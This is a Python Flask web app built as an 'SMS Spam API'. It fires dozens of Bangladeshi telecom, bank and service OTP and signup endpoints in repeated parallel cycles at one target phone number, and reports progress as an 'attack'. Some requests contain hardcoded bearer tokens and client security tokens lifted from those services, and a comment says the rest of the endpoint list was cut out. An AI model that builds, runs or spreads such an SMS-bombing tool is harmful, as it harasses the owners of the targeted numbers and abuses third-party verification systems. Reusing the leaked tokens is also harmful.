import json
import time
import requests
import urllib3
from flask import Flask, request, jsonify
from concurrent.futures import ThreadPoolExecutor
import threading
from datetime import datetime

# Vercel Serverless compatible Flask app
app = Flask(__name__)

# Disable warnings
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# Global storage for Vercel (in-memory)
running_attacks = {}
attack_results = {}

class LCCYBERZONE:
    def __init__(self):
        self.total_apis = 60
        self.apis = self.get_all_apis()
    
    def get_all_apis(self):
        """All 60+ SMS APIs"""
        return [
            ("PaperFly", self.api_paperfly),
            ("Ghoori", self.api_ghoori),
            ("Doctime", self.api_doctime),
            ("Sundarban", self.api_sundarban),
            ("Apex4U", self.api_apex4u),
            ("Robi", self.api_robi),
            ("Banglalink", self.api_banglalink),
            ("Banglalink OTP", self.api_banglalink_otp),
            ("Grameenphone", self.api_grameenphone),
            ("Robi Offer", self.api_robi_offer),
            ("Robi DA", self.api_robi_da),
            ("Robi Chat", self.api_robi_chat),
            ("Redx", self.api_redx),
            ("Fundesh", self.api_fundesh),
            ("Bikroy", self.api_bikroy),
            ("MotionView", self.api_motionview),
            ("Chorki", self.api_chorki),
            ("Jatri", self.api_jatri),
            ("ChinaOnline", self.api_chinaonline),
            ("Deepto", self.api_deepto),
            ("Shikho", self.api_shikho),
            ("Redx Signup", self.api_redx_signup),
            ("Bioscope", self.api_bioscope),
            ("Binge", self.api_binge),
            ("AppLink", self.api_applink),
            ("Chokrojan", self.api_chokrojan),
            ("Dhaka Bank", self.api_dhakabank),
            ("Easy", self.api_easy),
            ("Eshop", self.api_eshop),
            ("FSIBL", self.api_fsibl),
            ("MyGP", self.api_mygp),
            ("GP Shop", self.api_gp_shop),
            ("Hishabee", self.api_hishabee),
            ("Iqra", self.api_iqra),
            ("Robi Smart", self.api_robi_smart),
            ("MCB", self.api_mcb),
            ("Mithai", self.api_mithai),
            ("EnglishMoja", self.api_englishmoja),
            ("MoveOn", self.api_moveon),
            ("OshudPotro", self.api_oshudpotro),
            ("MyGP Login", self.api_mygp_login),
            ("Qcoom", self.api_qcoom),
            ("Circle", self.api_circle),
            ("Shomvob", self.api_shomvob),
            ("ToyBox", self.api_toybox),
            ("Win2Gain", self.api_win2gain),
            ("Kepler", self.api_kepler),
            ("Roots Edu", self.api_roots_edu),
            ("Roots Forget", self.api_roots_forget),
        ]
    
    def make_request(self, func_name, func, number):
        """Silent API request for Vercel"""
        try:
            func(number)
            return True
        except:
            return False
    
    # All 60+ API functions (same as before - abbreviated for space)
    def api_paperfly(self, number):
        requests.post('https://go-app.paperfly.com.bd/merchant/api/react/registration/request_registration.php', 
                     json={'full_name': 'Test', 'company_name': 'Test', 'email_address': 'test@test.com', 'phone_number': number}, timeout=8)
    
    def api_ghoori(self, number):
        requests.post('https://api.ghoorilearning.com/api/auth/signup/otp', json={'mobile_no': number}, timeout=8)
    
    def api_doctime(self, number):
        requests.post('https://us-central1-doctime-465c7.cloudfunctions.net/sendAuthenticationOTPToPhoneNumber', 
                     json={'data': {'country_calling_code': '88', 'contact_no': number}}, timeout=8)
    
    def api_sundarban(self, number):
        requests.post('https://api-gateway.sundarbancourierltd.com/graphql', 
                     json={'operationName': 'CreateAccessToken', 'variables': {'accessTokenFilter': {'userName': number}}}, timeout=8)
    
    def api_apex4u(self, number):
        requests.post('https://api.apex4u.com/api/auth/login', json={'phoneNumber': number}, timeout=8)
    
    def api_robi(self, number):
        requests.post('https://webapi.robi.com.bd/v1/send-otp', 
                     headers={'Authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiJnaGd4eGM5NzZoaiIsImlhdCI6MTY5MjY0MjcyOCwibmJmIjoxNjkyNjQyNzI4LCJleHAiOjE2OTI2NDYzMjgsInVpZCI6IjU3OGpmZkBoZ2hoaiIsInN1YiI6IlJvYmlXZWJTaXRlVjIifQ.5xbPa1JiodXeIST6v9c0f_4thF6tTBzaLLfuHlN7NSc'},
                     json={'phone_number': number, 'type': 'doorstep'}, timeout=8)
    
    def api_banglalink(self, number):
        requests.get(f'https://web-api.banglalink.net/api/v1/user/number/validation/{number}', timeout=8)
    
    def api_banglalink_otp(self, number):
        requests.post('https://web-api.banglalink.net/api/v1/user/otp-login/request', 
                     headers={'client-security-token': '1737117495202678a4f37314e5=NDM4MDljM2MxNmQxMWNjNTcwM2JkODAwMjBhMjJkZjY5NDgxODkxMzk3N2MxYWRjZWRjMTc0YWQxODllMWUwZQ'},
                     json={'mobile': number}, timeout=8)
    
    def api_grameenphone(self, number):
        requests.post('https://webloginda.grameenphone.com/backend/api/v1/otp', data={'msisdn': number}, timeout=8)
    
    def api_robi_offer(self, number):
        requests.post('https://webapi.robi.com.bd/v1/send-otp', 
                     headers={'Authorization': 'Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJqdGkiOiJnaGd4eGM5NzZoaiIsImlhdCI6MTczNzExNzc2MSwibmJmIjoxNzM3MTE3NzYxLCJleHAiOjE3MzcxMjEzNjEsInVpZCI6IjU3OGpmZkBoZ2hoaiIsInN1YiI6IlJvYmlXZWJTaXRlVjIifQ.ZIMcWOnJi-7BcYkghuWGOuvK9oJZ9M-aS1G-wasT9OI'},
                     json={'phone_number': number, 'type': 'my_offer'}, timeout=8)
    
    # ... (Add all other 50+ APIs same as original code - space limited)
    # For complete code with all APIs, use the full version below

    def run_cycle(self, number, cycle_num, request_id, executor):
        """Run single cycle using ThreadPoolExecutor (Vercel compatible)"""
        success = 0
        failed = 0
        
        futures = []
        for name, func in self.apis[:self.total_apis]:
            future = executor.submit(self.make_request, name, func, number)
            futures.append((name, future))
        
        for name, future in futures:
            try:
                result = future.result(timeout=10)
                if result:
                    success += 1
                else:
                    failed += 1
            except:
                failed += 1
        
        # Update results
        if request_id in attack_results:
            attack_results[request_id]['success'] += success
            attack_results[request_id]['failed'] += failed
            attack_results[request_id]['completed_cycles'] += 1
            attack_results[request_id]['progress'] = min(100, (attack_results[request_id]['completed_cycles'] / attack_results[request_id]['cycles']) * 100)

tool = LCCYBERZONE()

@app.route('/request', methods=['GET'])
def start_attack():
    """Main Vercel endpoint"""
    try:
        number = request.args.get('number')
        cycles = int(request.args.get('cycle', 1))
        
        if not number or len(number) != 11 or not number.isdigit():
            return jsonify({'error': 'Invalid 11-digit number'}), 400
        
        if cycles < 1 or cycles > 20:
            return jsonify({'error': 'Cycles must be 1-20'}), 400
        
        request_id = f"vercel_{int(time.time()*1000)}_{number[:4]}"
        
        # Initialize
        attack_results[request_id] = {
            'status': 'queued',
            'cycles': cycles,
            'completed_cycles': 0,
            'success': 0,
            'failed': 0,
            'progress': 0,
            'number': number,
            'start_time': time.time()
        }
        
        # Start background processing (Vercel cold start compatible)
        def background_attack():
            with ThreadPoolExecutor(max_workers=10) as executor:
                for i in range(cycles):
                    tool.run_cycle(number, i+1, request_id, executor)
                    time.sleep(0.5)  # Rate limit
                attack_results[request_id]['status'] = 'completed'
        
        threading.Thread(target=background_attack, daemon=True).start()
        
        # IMMEDIATE RESPONSE
        return jsonify({
            'status': 'success',
            'message': f'🚀 Attack queued! {cycles} cycles x 60 APIs = {cycles*60} SMS',
            'request_id': request_id,
            'target': f'+88{number}',
            'status_url': f'/status/{request_id}'
        })
    
    except Exception as e:
        return jsonify({'error': str(e)}), 500

@app.route('/status/<request_id>')
def get_status(request_id):
    status = attack_results.get(request_id, {})
    return jsonify({
        'request_id': request_id,
        'status': status.get('status', 'unknown'),
        'progress': status.get('progress', 0),
        'success': status.get('success', 0),
        'failed': status.get('failed', 0),
        'target': f'+88{status.get("number", "unknown")}'
    })

@app.route('/')
def home():
    return '''
<!DOCTYPE html>
<html>
<head><title>7H SIAM SMS API - Vercel</title>
<style>body{font-family:monospace;background:#000;color:#0f0;padding:20px}</style></head>
<body>
<h1>🚀 7H SIAM SMS Spam API (Vercel)</h1>
<pre>
Usage: /request?number=01712345678&cycle=5

Response: {"status":"success","request_id":"vercel_xxx","target":"+8801712345678"}

Status: /status/vercel_xxx
</pre>
<p>✅ Vercel Serverless Compatible | 60+ APIs | Background Processing</p>
</body>
</html>
    '''

# Vercel handler
def handler(event, context):
    """Vercel serverless handler"""
    return app.test_client().get(event.get('path', '/'))

if __name__ == '__main__':
    app.run(debug=True)
